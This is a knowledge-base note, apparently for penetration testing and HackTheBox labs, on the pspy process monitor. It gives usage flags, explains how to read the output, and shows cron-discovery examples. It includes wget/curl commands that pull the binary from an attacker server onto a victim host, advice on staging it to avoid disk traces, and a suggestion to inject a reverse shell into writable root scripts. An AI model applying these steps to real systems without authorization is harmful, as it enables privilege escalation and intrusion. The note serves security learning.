---
title: "pspy"
type: tool
tags: [cron, enumeration, linux, post-exploitation, privilege-escalation]
date_created: 2026-05-12
date_updated: 2026-05-12
sources: [0xdf-tools-pspy]
phase: postex
---

# pspy

## Purpose

pspy monitors running Linux processes without requiring root privileges by reading from `/proc`, revealing cron jobs, scripts, and commands executed by other users (including root) that are invisible to a normal `ps` snapshot.

## Install / Setup

### Download

Binaries are released at: `https://github.com/DominicBreuker/pspy/releases`

Four variants:

| Binary | Use case |
|---|---|
| `pspy64` | 64-bit Linux, dynamically linked (most common) |
| `pspy32` | 32-bit Linux, dynamically linked |
| `pspy64s` | 64-bit Linux, statically linked (old kernels, Alpine, minimal systems) |
| `pspy32s` | 32-bit Linux, statically compiled |

The `s` suffix variants are self-contained and work on systems with old glibc or stripped environments.

### Transfer to victim

```bash
# On attacker — serve with Python webserver
python3 -m http.server 80

# On victim — fetch with wget
wget 10.10.14.6/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64

# Or with curl
curl 10.10.14.6/pspy64 -o /dev/shm/pspy64
chmod +x /dev/shm/pspy64
```

Use `/dev/shm` or `/tmp` as staging directories — they are world-writable and memory-backed (avoids disk writes on `/dev/shm`).

---

## Core Usage

```bash
# Standard run — monitor process events
./pspy64

# Monitor both process events and filesystem events
./pspy64 -f

# Monitor filesystem events only in specific directories (reduces noise)
./pspy64 -f -r /usr/bin -r /bin -r /usr/local/bin

# Set polling interval in milliseconds (default 100ms)
./pspy64 -i 500

# Disable color output
./pspy64 -c=false
```

Key flags:

| Flag | Purpose |
|---|---|
| `-f` | Monitor filesystem events via inotify (in addition to process events) |
| `-r <dir>` | Restrict filesystem monitoring to specific directory (can repeat) |
| `-i <ms>` | Polling interval in milliseconds |
| `-c` | Enable/disable color (default true) |

---

## Reading Output

Each line has the format:

```
<timestamp> CMD: UID=<uid>  PID=<pid>  | <full command line>
```

Example output:
```
2023/03/14 01:46:01 CMD: UID=0     PID=18659  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
2022/10/05 04:57:15 CMD: UID=0     PID=3440   | mail -s Leave Request: christopher.jones christine
2023/08/31 20:38:01 CMD: UID=1000  PID=2488   | /bin/sh -c /home/juno/shadow-simulation.sh
```

**UID interpretation:**

| UID | Meaning |
|---|---|
| 0 | root |
| 33 | www-data (Debian/Ubuntu) |
| 1000+ | Regular user account |

**Filesystem event format (with `-f`):**
```
2021/01/27 16:56:01 FS:                 OPEN | /bin/dbmsg
2021/01/27 16:56:01 FS:               ACCESS | /bin/dbmsg
2021/01/27 16:56:01 FS:        CLOSE_NOWRITE | /bin/dbmsg
```

Event types: `OPEN`, `ACCESS`, `CLOSE_NOWRITE`, `CLOSE_WRITE`, `CREATE`, `MODIFY`, `DELETE`, `MOVED_FROM`, `MOVED_TO`.

---

## Common Use Cases

- **Discover cron jobs run by root**

  Run pspy and wait for at least 2 minutes to catch minute-interval crons; wait 5+ minutes for longer-interval jobs. Root cron jobs show `UID=0`.

```bash
./pspy64
# Wait 2-3 minutes, watch for UID=0 commands firing at :00/:01 seconds
```

  Example finding from Epsilon:
```
2022/03/09 20:42:01 CMD: UID=0    PID=3755   | /bin/sh -c /usr/bin/backup.sh
2022/03/09 20:42:01 CMD: UID=0    PID=3759   | /usr/bin/tar -cvf /opt/backups/462504870.tar /var/www/app/
```

- **Find writable scripts called by root**

  When pspy reveals root executing a script, check if the current user can write to it:
```bash
# pspy reveals: CMD: UID=0 | /bin/bash /usr/bin/backup.sh
ls -la /usr/bin/backup.sh
# If writable, inject a payload (reverse shell, SUID copy, etc.)
```

- **Find secrets in command arguments**

  Credentials and tokens sometimes appear in command-line arguments. From Laser:
```
2020/09/13 11:24:45 CMD: UID=0    PID=52688  | sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/apiv2-feed root@172.18.0.2:/root/feeds/
```
  Note: passwords passed via `sshpass` are often masked with `z` characters but reveal themselves occasionally.

- **Find SCP/SSH patterns indicating file pull from a container**

  From Fatty:
```
2020/03/27 20:05:02 CMD: UID=0    PID=148    | sshd: qtc [priv]
2020/03/27 20:05:02 CMD: UID=1000 PID=149    | scp -f /opt/fatty/tar/logs.tar
```
  Indicates another host is pulling files from the container over SSH at regular intervals.

- **Detect file system events on binaries (use `-f`)**

  From Crossfit, where a non-standard binary was being executed via cron but the process appeared only briefly:
```bash
./pspy64 -f -r /usr/bin -r /bin -r /usr/local/bin
```
  Output:
```
2021/01/27 16:56:01 FS:   OPEN    | /bin/dbmsg
2021/01/27 16:56:01 CMD: UID=1000 PID=3903   | /bin/sh -c /usr/bin/php /home/isaac/send_updates/send_updates.php
```

- **Identify scripts triggered by application actions**

  From Bamboo, pspy revealed a root-owned script was called when a specific web UI button was clicked, not on a timer:
```
2026/01/28 00:47:16 CMD: UID=0  PID=10219  | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
```
  The papercut user owned the `server-command` binary, making it a hijack vector.

- **Spot cron jobs calling user-writable paths via glob**

  From Inject, root was running ansible on a wildcard path in a directory writable by the current user:
```
2023/03/14 01:46:01 CMD: UID=0  PID=18659  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
```
  Writing a malicious `.yml` into `/opt/automation/tasks/` caused it to execute as root.

---

## Tips and Gotchas

- **Run time matters.** A one-minute cron fires at `:00` or `:01` of every minute. Run pspy for at least 2-3 full minutes before concluding there are no crons. For jobs that run every 5 or 10 minutes, run longer.

- **pspy only sees processes it can read from `/proc`.** On some hardened kernels or in containers with restricted `/proc` mounts (e.g. `hidepid=2`), pspy may not see other users' processes at all. In that case, you may only see your own processes.

- **Filesystem events (`-f`) are noisy.** Without restricting directories with `-r`, the output floods quickly. Use `-r` to focus on common binary paths to find which binaries are being called.

- **Timestamps are local to the victim system.** If the victim clock is wrong, the timestamps in pspy output will be wrong too — but the pattern (interval, ordering) remains useful.

- **pspy itself creates noise.** When you first start pspy, it generates a burst of inotify events from its own initialization scan. Wait a few seconds for "Draining file system events due to startup... done" before trusting the output.

- **Process masking of arguments.** Some programs (particularly `sshpass`) actively overwrite their own `/proc/<pid>/cmdline` after startup to hide sensitive arguments. pspy may catch the original command-line before the overwrite happens, but only intermittently. Let it run through multiple cron executions to catch the unmasked version.

- **Staging location.** `/dev/shm` is preferred: it is memory-backed, world-writable, and does not leave traces on disk. Some `/dev/shm` mounts are `noexec` — if execution fails, fall back to `/tmp`.

- **Static binaries for minimal systems.** Docker containers and Alpine Linux images often lack glibc. Use `pspy64s` or `pspy32s` (static builds) in those environments.

- **Size.** pspy64 is approximately 3 MB. Confirm sufficient space before writing to restricted partitions.

---

## Related Techniques

- [[linux-privesc]] — cron abuse, writable script hijacking, SUID hunting
- [[ad-lateral-movement]] — scp/ssh credential leaks in process arguments

---

## Sources

- 0xdf HTB writeups: awkward, bamboo, book, crossfit, download, epsilon, era, fatty, inject, interface, jupiter, laser
- pspy GitHub: https://github.com/DominicBreuker/pspy
